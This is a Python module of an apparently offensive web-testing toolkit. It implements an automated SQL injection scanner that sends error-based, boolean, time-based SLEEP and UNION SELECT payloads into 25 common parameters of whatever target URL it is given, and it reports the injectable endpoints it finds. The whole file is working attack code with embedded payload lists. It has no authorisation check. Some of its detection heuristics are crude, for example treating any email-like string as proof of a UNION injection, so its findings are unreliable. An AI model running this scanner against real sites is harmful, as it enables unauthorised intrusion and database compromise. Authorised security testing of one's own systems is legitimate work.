#!/usr/bin/env python3
"""
Module 7: SQL Injection Scanner
5 Layer SQL injection detection | Waktu: 12-15 menit | Akurasi: 90%
Mendeteksi: Error-based, Boolean-based, Time-based, Union-based
"""

import asyncio
import time
import random
import hashlib
import re
from typing import List, Dict, Optional
from urllib.parse import quote
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class SQLiScanner:
    def __init__(self, target: str, threads: int = 50, timeout: int = 5):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ SQLI PARAMETERS (25 parameter - dikurangi) ============
        self.sqli_params = [
            'id', 'user', 'user_id', 'uid', 'account', 'account_id',
            'product', 'product_id', 'item', 'post', 'page', 'page_id',
            'q', 'query', 'search', 'keyword', 'filter',
            'name', 'username', 'email', 'phone',
            'sort', 'order', 'limit', 'offset'
        ]
        
        # ============ ERROR-BASED PAYLOADS (5 payload) ============
        self.error_payloads = [
            "'", "\"", "')", "\")",
            "' OR '1'='1",
            "' OR 1=1--",
            "1' AND '1'='2",
            "' UNION SELECT NULL--"
        ]
        
        # ============ BOOLEAN-BASED PAYLOADS (3 pair) ============
        self.boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1", "' AND 1=2"),
            ("' OR '1'='1", "' OR '1'='2"),
        ]
        
        # ============ TIME-BASED PAYLOADS (3 payload) ============
        self.time_payloads = [
            "' AND SLEEP(3)--",
            "' OR SLEEP(3)--",
            "1' AND SLEEP(3)#",
        ]
        
        # ============ UNION-BASED PAYLOADS (3 payload) ============
        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT version(),NULL--",
        ]
        
        # ============ DATABASE SIGNATURES ============
        self.db_signatures = {
            'mysql': ['mysql', 'sql syntax', 'mariadb', 'you have an error'],
            'postgresql': ['postgresql', 'postgres', 'syntax error'],
            'mssql': ['sql server', 'mssql', 'incorrect syntax'],
            'oracle': ['oracle', 'ora-'],
            'sqlite': ['sqlite', 'sqlite3']
        }
    
    async def test_error_based(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Error-based SQL injection detection"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={quote(payload)}"
            response = await client.get(url)
            
            if response:
                response_text = await response.text()
                body = response_text.lower() if response_text else ""
                
                for db_type, signatures in self.db_signatures.items():
                    for sig in signatures:
                        if sig in body:
                            return {
                                "vulnerable": True,
                                "type": "ERROR_BASED_SQLI",
                                "database": db_type,
                                "severity": "critical",
                                "confidence": 100,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload[:50]
                            }
        return None
    
    async def test_boolean_based(self, endpoint: str, param: str, true_payload: str, false_payload: str) -> Optional[Dict]:
        """Boolean-based SQL injection detection"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url_true = f"{endpoint}?{param}={quote(true_payload)}"
            resp_true = await client.get(url_true)
            
            url_false = f"{endpoint}?{param}={quote(false_payload)}"
            resp_false = await client.get(url_false)
            
            if resp_true and resp_false:
                body_true = await resp_true.text()
                body_false = await resp_false.text()
                
                len_true = len(body_true)
                len_false = len(body_false)
                len_diff = abs(len_true - len_false)
                
                if len_diff > 50:
                    true_hash = hashlib.md5(body_true.encode()).hexdigest()
                    false_hash = hashlib.md5(body_false.encode()).hexdigest()
                    
                    if true_hash != false_hash:
                        return {
                            "vulnerable": True,
                            "type": "BOOLEAN_BASED_SQLI",
                            "severity": "high",
                            "confidence": 90,
                            "endpoint": endpoint,
                            "parameter": param,
                            "true_payload": true_payload[:50],
                            "false_payload": false_payload[:50],
                            "length_difference": len_diff
                        }
        return None
    
    async def test_time_based(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Time-based SQL injection detection"""
        
        times = []
        
        for _ in range(2):
            async with HTTPClient(self.target, timeout=8, retries=1) as client:
                url = f"{endpoint}?{param}={quote(payload)}"
                start_time = time.perf_counter()
                response = await client.get(url)
                elapsed_ms = (time.perf_counter() - start_time) * 1000
                
                if response:
                    times.append(elapsed_ms)
                else:
                    return None
            
            await asyncio.sleep(0.3)
        
        if times:
            avg_time = sum(times) / len(times)
            if avg_time > 2500:
                return {
                    "vulnerable": True,
                    "type": "TIME_BASED_SQLI",
                    "severity": "high",
                    "confidence": 85,
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload[:50],
                    "avg_delay_ms": round(avg_time, 2)
                }
        
        return None
    
    async def test_union_based(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Union-based SQL injection detection"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={quote(payload)}"
            response = await client.get(url)
            
            if response:
                body = await response.text()
                
                patterns = [
                    r'[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+\.[a-zA-Z]{2,}',
                    r'root@localhost', 'mysql', 'postgres'
                ]
                
                for pattern in patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        return {
                            "vulnerable": True,
                            "type": "UNION_BASED_SQLI",
                            "severity": "critical",
                            "confidence": 95,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload[:50]
                        }
        return None
    
    async def scan_endpoint(self, endpoint: str, param: str) -> List[Dict]:
        """Scan single endpoint parameter"""
        
        findings = []
        
        # Layer 1: Error-based
        for payload in self.error_payloads:
            result = await self.test_error_based(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 SQLi on {endpoint} via {param}", "ERROR_BASED")
                return findings
        
        # Layer 2: Boolean-based
        for true_payload, false_payload in self.boolean_payloads:
            result = await self.test_boolean_based(endpoint, param, true_payload, false_payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🔴 Boolean SQLi on {endpoint} via {param}", "")
                return findings
        
        # Layer 3: Time-based
        for payload in self.time_payloads:
            result = await self.test_time_based(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🟠 Time-based SQLi on {endpoint} via {param}", "")
                return findings
        
        # Layer 4: Union-based
        for payload in self.union_payloads:
            result = await self.test_union_based(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 Union SQLi on {endpoint} via {param}", "")
                return findings
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full SQL injection scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/api", "/search", "/product", "/user", "/id"]
        
        total_tests = len(endpoints) * len(self.sqli_params) * (
            len(self.error_payloads) + len(self.boolean_payloads) + 
            len(self.time_payloads) + len(self.union_payloads)
        )
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT SQL INJECTION SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {len(self.sqli_params)}")
        logger.info(f"📈 Total tests: {total_tests:,}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"⏱️  Estimated time: 12-15 minutes")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing endpoint: {endpoint}")
            
            for param in self.sqli_params:
                self.stats['payloads_tested'] += 1
                findings = await self.scan_endpoint(endpoint, param)
                self.findings.extend(findings)
                if findings:
                    logger.info(f"  ✅ Found SQLi via: {param}")
                await asyncio.sleep(0.02)
            
            self.stats['endpoints_tested'] += 1
            elapsed = time.time() - start_time
            logger.info(f"  ✅ Done: {endpoint} - {elapsed/60:.1f}m elapsed")
        
        elapsed = time.time() - start_time
        
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        print(f"\n{'='*60}")
        print(f"📊 SQL INJECTION SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f}s ({elapsed/60:.1f}m)")
        print(f"📡 Endpoints: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads: {self.stats['payloads_tested']}")
        print(f"🎯 Findings: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings[:10]:
                print(f"   🔥 {f['type']} | {f.get('parameter')} | Confidence: {f.get('confidence', 0)}%")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings[:10]:
                print(f"   ⚡ {f['type']} | {f.get('parameter')} | Confidence: {f.get('confidence', 0)}%")
        
        print(f"\n{'='*60}")
        
        rating = "🏆 CRITICAL - Database compromise possible!" if critical_findings else \
                 "⭐ HIGH - SQL injection confirmed" if high_findings else \
                 "✅ SECURE - No SQL injection detected"
        
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "sqli_scanner",
            "mode": "balanced",
            "target": self.target,
            "scan_time_minutes": round(elapsed/60, 1),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "findings": self.findings
        }
    
    @staticmethod
    async def run(target: str, custom_endpoints: List[str] = None) -> Dict:
        """Run SQL injection scanner"""
        scanner = SQLiScanner(target)
        return await scanner.scan(custom_endpoints)